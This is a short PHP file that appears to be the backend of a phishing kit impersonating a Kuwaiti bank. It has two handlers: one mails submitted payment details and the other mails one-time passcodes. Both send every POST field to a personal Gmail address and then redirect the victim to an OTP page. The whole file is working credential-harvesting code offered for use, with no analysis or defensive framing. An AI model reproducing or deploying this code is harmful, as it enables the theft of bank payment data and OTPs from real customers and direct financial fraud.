<?php

header("Access-Control-Allow-Origin: https://nbkkuwait.com");

header('Content-Type: application/json');


if(isset($_POST)) {
    if(isset($_POST['action']) =='sendtEmailPatment'){  
        sendtEmailPatment($_POST);
    }if(isset($_POST['action']) =='sendOTP'){  
        sendOTP($_POST) ;
    }

    exit;  
}

function sendtEmailPatment($data) {
    $to = "hassankiwan92@gmail.com";
    $sender="admin@nbkkuwait.com";
    $subject = "Payment Info";
    $message = "";
    foreach ($data as $key => $msg) {
        $message .= "$key :  $msg\n";
    }
    $headers = "From: $sender\r\n";
    $headers .= "Reply-To: $sender\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect if using GET only
        echo json_encode(['status' => 'success', 'redirect' => './otp.php']);
        exit;
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed.']);
      
    }
    exit;
}




function sendOTP($data){
    $to = "hassankiwan92@gmail.com";
    $sender="admin@nbkkuwait.com";
    $subject = "OTP";
    $message="";
    foreach($data as $key=>$msg){
        $message.= "$key :  $msg\n";
    }
    $headers = "From: $sender\r\n";
    $headers .= "Reply-To: $sender\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect if using GET only
        echo json_encode(['status' => 'success', 'redirect' => './otp.php']);
        exit;
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed.']);
      
    }
    exit;
}
?>
